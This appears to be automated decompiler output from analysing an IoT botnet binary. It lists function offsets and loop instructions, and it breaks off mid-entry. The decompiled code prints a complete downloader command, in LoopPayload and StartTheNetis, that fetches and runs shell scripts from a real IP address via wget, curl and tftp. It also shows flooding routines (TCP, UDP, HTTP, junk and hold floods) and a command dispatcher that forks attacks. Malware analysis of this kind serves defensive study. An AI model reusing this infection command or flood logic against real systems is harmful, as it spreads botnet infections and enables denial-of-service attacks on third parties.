++++++++ FUNCTION END 54275
++++++++ FUNCTION LENGTH 137
    return __GI_vfprintf((int16_t *)a1, a2, (int32_t)&v134, v133);
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 53901
++++++++ FUNCTION END 54135
++++++++ FUNCTION LENGTH 234
        while (true) {
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 50119
++++++++ FUNCTION END 50268
++++++++ FUNCTION LENGTH 149
    if (__libc_open("/dev/null", v135) != v133) {
=================FUNCTION : __libc_creat ===================
++++++++ FUNCTION START 27743
++++++++ FUNCTION END 27878
++++++++ FUNCTION LENGTH 135
    return __libc_open((char *)a1, 577);
=================FUNCTION : wait4 ===================
++++++++ FUNCTION START 53309
++++++++ FUNCTION END 53458
++++++++ FUNCTION LENGTH 149
    int32_t v137 = wait4(v133, v135, v134, v136); // 0x8054ff5
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 37889
++++++++ FUNCTION END 38031
++++++++ FUNCTION LENGTH 142
    if (inet_aton((char *)a1, (int32_t)&result) != 0) {
=================FUNCTION : __GI_clock_getres ===================
++++++++ FUNCTION START 51923
++++++++ FUNCTION END 52069
++++++++ FUNCTION LENGTH 146
    int32_t v133 = clock_getres(clk_id, res); // 0x8054e3b
=================FUNCTION : __libc_open ===================
++++++++ FUNCTION START 27589
++++++++ FUNCTION END 27740
++++++++ FUNCTION LENGTH 151
    int32_t fd = open(path, 0x1000000 * a2 / 0x1000000); // 0x80516ff
=================FUNCTION : __libc_fork ===================
++++++++ FUNCTION START 26545
++++++++ FUNCTION END 26692
++++++++ FUNCTION LENGTH 147
    int32_t v134 = fork(v133); // 0x8051595
=================FUNCTION : csum ===================
++++++++ FUNCTION START 8730
++++++++ FUNCTION END 8993
++++++++ FUNCTION LENGTH 263
        while (true) {
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 38034
++++++++ FUNCTION END 38172
++++++++ FUNCTION LENGTH 138
    gethostbyname_r(a1, &v134, (int32_t)&v133, 460, (int32_t)&result, v131, v132, v132);
=================FUNCTION : __libc_send ===================
++++++++ FUNCTION START 39283
++++++++ FUNCTION END 39417
++++++++ FUNCTION LENGTH 134
    return __socketcall(9, (int32_t)&a1);
=================FUNCTION : __GI_inet_ntoa_r ===================
++++++++ FUNCTION START 37589
++++++++ FUNCTION END 37748
++++++++ FUNCTION LENGTH 159
    while (true) {
=================FUNCTION : srand ===================
++++++++ FUNCTION START 46333
++++++++ FUNCTION END 46473
++++++++ FUNCTION LENGTH 140
    srandom_r((int64_t)a1, (int32_t)&v134);
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 9281
++++++++ FUNCTION END 9424
++++++++ FUNCTION LENGTH 143
        __libc_close(a1);
=================FUNCTION : LoopPayload ===================
++++++++ FUNCTION START 11189
++++++++ FUNCTION END 11324
++++++++ FUNCTION LENGTH 135
    return __libc_system((int32_t)"cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n");
=================FUNCTION : __libc_connect ===================
++++++++ FUNCTION START 38735
++++++++ FUNCTION END 38869
++++++++ FUNCTION LENGTH 134
    return __socketcall(3, (int32_t)&a1);
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ trim ====================================
++++++++ WHILE START : 1806 
++++++++ WHILE FUNCTION : trim 
++++++++ WHILE END : 1862 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 2 @ prints ====================================
++++++++ WHILE START : 2204 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2218 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(v135, v134);
=============================WHILE LOOPS ID : 3 @ prints ====================================
++++++++ WHILE START : 2363 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2377 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(v135, v134);
=============================WHILE LOOPS ID : 5 @ print ====================================
++++++++ WHILE START : 2886 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 3174 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)result, v141);
		while (true) {
		while (true) {
		int32_t v167 = prints(v165, NULL, (int32_t)&v166, (int32_t)&v166); // 0x8048798
		int32_t v169 = printi(v168) + result; // 0x8048769
		result2 = printi(v164) + result;
		result2 = printi(v163) + result;
		result2 = printi(v162) + result;
		int32_t v171 = prints((int32_t)v170, (char *)v152, v146, result) + result; // 0x8048685
=============================WHILE LOOPS ID : 6 @ fdpclose ====================================
++++++++ WHILE START : 4231 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 4255 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v140 = __libc_waitpid(v139, (int32_t)&v138, 0); // 0x8048ba6
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v137, 0);
=============================WHILE LOOPS ID : 9 @ getBogos ====================================
++++++++ WHILE START : 5253 
++++++++ WHILE FUNCTION : getBogos 
++++++++ WHILE END : 5311 
++++++++ INTRESTING INSTRUCTIONS :  
		uppercase((char *)&v134);
		if (strstr(v135, "BOGOMIPS") != v135) {
		if (fdgets(v135, 0x1000, v133) == 0) {
		while (true) {
		while (true) {
		__libc_close(v133);
=============================WHILE LOOPS ID : 10 @ recvLine ====================================
++++++++ WHILE START : 5790 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 5851 
++++++++ INTRESTING INSTRUCTIONS :  
		HackerPrint(v149, (int32_t)"PING");
		while (true) {
		if (__libc_recv(v149, (int32_t)&v152, 1, 0) != 1) {
=============================WHILE LOOPS ID : 13 @ listFork ====================================
++++++++ WHILE START : 6388 
++++++++ WHILE FUNCTION : listFork 
++++++++ WHILE END : 6405 
++++++++ INTRESTING INSTRUCTIONS :  
		free(v137);
=============================WHILE LOOPS ID : 14 @ matchPrompt ====================================
++++++++ WHILE START : 6743 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 6795 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 15 @ readUntil ====================================
++++++++ WHILE START : 6936 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 7024 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v139 = __libc_recv(a1, v138, 1, 0); // 0x804990d
		int32_t v142 = __libc_recv(a1, v138 + 1, 2, 0); // 0x804994e
		if (strstr(v134, (char *)a2) == 0) {
=============================WHILE LOOPS ID : 17 @ contains_string ====================================
++++++++ WHILE START : 10288 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 10304 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strcasestr((char *)a1, v136) == 0) {
=============================WHILE LOOPS ID : 18 @ StartTheLelz ====================================
++++++++ WHILE START : 10460 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 11033 
++++++++ INTRESTING INSTRUCTIONS :  
		case 0: {
		socket(0x10000 * v155 / 0x10000, v156, v154);
		if (__libc_connect(v156, v154, 0) == -1) {
		sclose(v156);
		socket(0x10000 * v155 / 0x10000, v156, v154);
		case 1: {
		sclose(v152);
		sclose(v167);
		getsockopt(v152, v168, v165, 10, v161);
		sclose(v152);
		case 2: {
		case 3: {
		if (__libc_send(v169, v137, v148, v134) >= 0) {
		if (__libc_send(v169, v137, v148, v134) >= 0) {
		case 4: {
		case 5: {
		if (__libc_send(v170, v140, v137, v148) >= 0) {
		if (__libc_send(v170, v140, v137, v148) >= 0) {
		case 6: {
		get_telstate_host();
		HackerPrint(v142, v140);
		get_telstate_host();
		HackerPrint(v142, v140);
		case 7: {
		if (__libc_send(v173, v142, v140, v137) >= 0) {
		sclose(v173);
		while (true) {
=============================WHILE LOOPS ID : 19 @ StartTheNetis ====================================
++++++++ WHILE START : 11176 
++++++++ WHILE FUNCTION : StartTheNetis 
++++++++ WHILE END : 11185 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v137 = socket(2, 2, 0); // 0x804daf0
		NetisRanges(v137);
		sprintf(v136, (int32_t)"%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00");
		__libc_sendto(v137, v136, v138, 0, v134, 16);
=============================WHILE LOOPS ID : 20 @ sendHTTP ====================================
++++++++ WHILE START : 11957 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 11995 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_fork(v137) != 0) {
		while (true) {
		int32_t v138 = socket_connect(a1, a3); // 0x804dfcf
		__libc_close(v138);
=============================WHILE LOOPS ID : 21 @ sendSTD ====================================
++++++++ WHILE START : 12150 
++++++++ WHILE FUNCTION : sendSTD 
++++++++ WHILE END : 12176 
++++++++ INTRESTING INSTRUCTIONS :  
		random();
		__libc_send(v133, v143, 75, 0);
		__libc_connect(v133, v136, 16);
		__libc_close(v133);
=============================WHILE LOOPS ID : 22 @ sendUDP ====================================
++++++++ WHILE START : 12348 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 12373 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v137, v139, a5, 0, (int32_t)&v134, 16);
		rand_cmwc(v137);
=============================WHILE LOOPS ID : 23 @ sendUDP ====================================
++++++++ WHILE START : 12454 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 12495 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v158, (int32_t)&v159, (int32_t)&v159, (int32_t)&v159, (int32_t)&v159, (int32_t)&v159);
		*v150 = (int16_t)(0x10000 * rand_cmwc(v158) / 0x10000);
		v160 = rand_cmwc(v158);
		*(int16_t *)(v148 | 4) = (int16_t)(0x10000 * rand_cmwc(v163) / 0x10000);
=============================WHILE LOOPS ID : 24 @ sendTCP ====================================
++++++++ WHILE START : 12879 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13014 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v173 = ((int32_t)(v171 | _strncmp(v158, "rst", 4) % 2 == 0) | v172) ^ 1; // 0x804e96d
		int32_t v183 = ((int32_t)(v181 | _strncmp(v158, "psh", 4) % 2 == 0) | v182) ^ 1; // 0x804ea60
		HackerPrint(4, (int32_t)"psh");
		v167 = "psh";
		v167 = "psh";
=============================WHILE LOOPS ID : 25 @ sendTCP ====================================
++++++++ WHILE START : 13038 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13067 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v150, v139, v134, v135, v136, 0);
		*(int16_t *)(v140 | 4) = (int16_t)(0x10000 * rand_cmwc(v150) / 0x10000);
		*v144 = rand_cmwc(v150);
		*v142 = (int16_t)(0x10000 * rand_cmwc(v150) / 0x10000);
		*v154 = (int16_t)tcpcsum();
=============================WHILE LOOPS ID : 26 @ sendTCP ====================================
++++++++ WHILE START : 13106 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13121 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v150, v139, v134, v135, v136, 0);
		*(int16_t *)(v140 | 4) = (int16_t)(0x10000 * rand_cmwc(v150) / 0x10000);
		*v144 = rand_cmwc(v150);
		*v142 = (int16_t)(0x10000 * rand_cmwc(v150) / 0x10000);
		*v154 = (int16_t)tcpcsum();
=============================WHILE LOOPS ID : 28 @ sendJUNK ====================================
++++++++ WHILE START : 13305 
++++++++ WHILE FUNCTION : sendJUNK 
++++++++ WHILE END : 13431 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_close(v162);
		getsockopt(v156, v155, 0x2710, v154, (int32_t)&v161);
		__libc_close(v156);
		makeRandomStr((char *)v153, v134);
		if (__libc_send(v156, v155, v145, v154) != -1) {
		__libc_close(v156);
		socket(v153, v134, v157);
		if (__libc_connect(v153, v134, v157) != -1) {
		__libc_close(v153);
=============================WHILE LOOPS ID : 30 @ sendHOLD ====================================
++++++++ WHILE START : 13612 
++++++++ WHILE FUNCTION : sendHOLD 
++++++++ WHILE END : 13720 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_close(v157);
		getsockopt(v159, v156, 0x2710, v152, (int32_t)&v153);
		__libc_close(v159);
		__libc_close(v163);
		socket(v150, v134, (int32_t)&v153);
		if (__libc_connect(v150, v134, (int32_t)&v153) != -1) {
		__libc_close(v150);
=============================WHILE LOOPS ID : 31 @ processCmd ====================================
++++++++ WHILE START : 14139 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14185 
++++++++ INTRESTING INSTRUCTIONS :  
		if (*v298 != __libc_getpid()) {
		kill(v300, 9);
=============================WHILE LOOPS ID : 32 @ processCmd ====================================
++++++++ WHILE START : 14273 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14289 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v301, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 36 @ processCmd ====================================
++++++++ WHILE START : 14515 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14524 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 38 @ processCmd ====================================
++++++++ WHILE START : 14579 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14595 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v303, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 40 @ processCmd ====================================
++++++++ WHILE START : 14707 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14716 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 42 @ processCmd ====================================
++++++++ WHILE START : 14807 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14826 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 44 @ processCmd ====================================
++++++++ WHILE START : 14944 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14953 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 46 @ processCmd ====================================
++++++++ WHILE START : 15027 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15036 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 48 @ processCmd ====================================
++++++++ WHILE START : 15149 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15158 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 51 @ processCmd ====================================
++++++++ WHILE START : 15335 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15344 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 53 @ processCmd ====================================
++++++++ WHILE START : 15407 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15416 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 55 @ processCmd ====================================
++++++++ WHILE START : 15520 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15529 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 57 @ processCmd ====================================
++++++++ WHILE START : 15607 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15624 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendCNC(v306, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 59 @ processCmd ====================================
++++++++ WHILE START : 15752 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15761 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 61 @ processCmd ====================================
++++++++ WHILE START : 15833 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15842 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 63 @ processCmd ====================================
++++++++ WHILE START : 15958 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15967 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 65 @ processCmd ====================================
++++++++ WHILE START : 16049 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16061 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 67 @ processCmd ====================================
++++++++ WHILE START : 16183 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16192 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 69 @ processCmd ====================================
++++++++ WHILE START : 16264 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16273 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 71 @ processCmd ====================================
++++++++ WHILE START : 16389 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16398 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 74 @ processCmd ====================================
++++++++ WHILE START : 16568 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16577 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 76 @ processCmd ====================================
++++++++ WHILE START : 16632 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16641 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 77 @ processCmd ====================================
++++++++ WHILE START : 16717 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16726 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 78 @ processCmd ====================================
++++++++ WHILE START : 16772 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16784 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 79 @ processCmd ====================================
++++++++ WHILE START : 16866 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16875 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 16911 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16920 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 81 @ processCmd ====================================
++++++++ WHILE START : 16996 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17005 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 17058 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17076 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHTTP(*v176, v196, (int16_t)v179, v194, v178, v177);
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 17182 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17191 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 17234 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17243 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 85 @ processCmd ====================================
++++++++ WHILE START : 17332 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17341 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 17394 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17406 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 17501 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17510 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 88 @ processCmd ====================================
++++++++ WHILE START : 17553 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17562 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 89 @ processCmd ====================================
++++++++ WHILE START : 17651 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17660 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 90 @ processCmd ====================================
++++++++ WHILE START : 17717 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17727 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 91 @ processCmd ====================================
++++++++ WHILE START : 17828 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17837 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 92 @ processCmd ====================================
++++++++ WHILE START : 17880 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17889 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 93 @ processCmd ====================================
++++++++ WHILE START : 17978 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17987 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 94 @ processCmd ====================================
++++++++ WHILE START : 18040 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18052 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 95 @ processCmd ====================================
++++++++ WHILE START : 18147 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18156 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 96 @ processCmd ====================================
++++++++ WHILE START : 18199 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18208 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 97 @ processCmd ====================================
++++++++ WHILE START : 18297 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18306 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 98 @ processCmd ====================================
++++++++ WHILE START : 18432 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18441 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 99 @ processCmd ====================================
++++++++ WHILE START : 18477 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18486 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 100 @ processCmd ====================================
++++++++ WHILE START : 18562 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18571 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendTCP(v279, v270, v271, v272, (char *)v276, v257, v258);
=============================WHILE LOOPS ID : 101 @ processCmd ====================================
++++++++ WHILE START : 18617 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18629 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 102 @ processCmd ====================================
++++++++ WHILE START : 18661 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18670 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 103 @ processCmd ====================================
++++++++ WHILE START : 18711 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18721 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v230, v227, v228);
		__libc_close(v133);
=============================WHILE LOOPS ID : 104 @ processCmd ====================================
++++++++ WHILE START : 18759 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18768 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 105 @ processCmd ====================================
++++++++ WHILE START : 18805 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18817 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendJUNK(v233, v240, v241);
		sendSTD(v233, (int16_t)v240, v241);
		sendHOLD(v233, v240, v241);
		__libc_close(v133);
=============================WHILE LOOPS ID : 106 @ processCmd ====================================
++++++++ WHILE START : 18849 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18858 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 107 @ processCmd ====================================
++++++++ WHILE START : 18943 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18959 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v310, v172, v173, v174, v175, v148);
=============================WHILE LOOPS ID : 108 @ processCmd ====================================
++++++++ WHILE START : 19018 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19027 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v254, (int16_t)v251, v252);
=============================WHILE LOOPS ID : 109 @ processCmd ====================================
++++++++ WHILE START : 19071 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 19083 
